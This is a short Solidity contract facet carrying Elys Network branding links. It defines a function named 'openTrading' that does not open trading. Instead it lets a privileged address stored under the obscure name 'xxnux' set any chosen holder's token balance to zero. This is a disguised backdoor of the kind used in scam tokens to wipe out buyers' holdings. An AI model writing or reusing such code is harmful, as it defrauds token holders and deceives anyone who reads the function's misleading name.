/*
 * SPDX-License-Identifier: MIT
 * Website: https://elys.network/
 * Whitepaper: https://elys-network.gitbook.io/docs
 * Twitter: https://twitter.com/elys_network
 * Telegram: https://t.me/elysnetwork
 * Discord Chat: https://discord.gg/elysnetwork
 * Medium: https://elysnetwork.medium.com/
 */
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
